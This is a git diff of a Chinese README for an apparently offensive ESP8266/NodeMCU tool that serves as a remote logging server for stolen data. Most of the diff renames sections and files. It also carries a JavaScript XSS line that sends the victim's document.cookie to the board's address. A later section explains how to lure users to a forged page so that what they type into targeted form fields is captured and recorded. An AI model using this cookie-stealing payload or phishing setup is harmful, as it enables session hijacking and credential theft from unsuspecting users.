@@ -1,4 +1,6 @@
-# ESP8266-remote-payloads
+# remote-payloads
+
+# ESP-01_FS_WEB
 
 ### esp8266闪存文件应用
 
@@ -50,18 +52,18 @@ img.src = 'http://192.168.1.103/logs?cookie='+encodeURIComponent(document.cookie
 //将192.168.1.103换成你esp8266服务器的地址
 ```
 
-# ESP8266-remote-payloads-cli
+# ESP-01_FS_CLI
 
 分为两个文件：
 
-- remote_payloads_cli.ino
-- remote_payloads_cli.py
+- ESP-01_FS_CLI.ino
+- remote_payloads.py
 
 其中remote_payloads_cli.ino在上传到esp8266之前，需要配置好用户名、密码、隐藏目录和wifi基本信息（当然，你也可以修改端口等信息，只要你清楚自己在做什么就行），如下
 
 ![config.png](./img/config.png)
 
-上传完成之后即可用remote_payload_cli.py连接（可被重命名，记得赋予可执行权限）
+上传完成之后即可用remote_payload.py连接（可被重命名，记得赋予可执行权限）
 
 ```
 usage: remote_payloads_cli.py [-h][-r <url:post>][-u <username>][-p <password>]
@@ -104,9 +106,9 @@ exit            log off and exit                exit
 
 ![sha1.png](./img/sha1.png)
 
-# ESP8266-remote-payloads-sd-cli
+# NodeMCU_SD_CLI
 
-与`ESP8266-remote-payloads-cli`共用一套客户端，命令兼容，只是将闪存改为SD卡。
+与`ESP-01_FS_CLI`共用一套客户端，命令兼容，只是将闪存改为SD卡。
 
 由于esp8266-01E模块引脚不足（或是不支持SPI协议？？），需要使用**模组**或**开发板**（如NodeMCU），图示为NodeMCU接线图。
 
@@ -159,7 +161,6 @@ window.onload = function() {
 3. 让用户访问该页面，则用户在你关注的输入框中输入的内容将会被发送到你的remote-paylaods并被记录下来
 
 ![sanfengyun_1.png](./img/sanfengyun_1.png)
-
 
 缺点：	1.由于remote-paylaods是HTTP服务器，所以当伪造页面为HTTPS时，其输入框可能会提示“不安全连接”
 	2.表单会正确发送至原服务器，但跳转资源可能会跳转到remote-payloads的域名下，而非原服务器域名下，导致出现空白页面
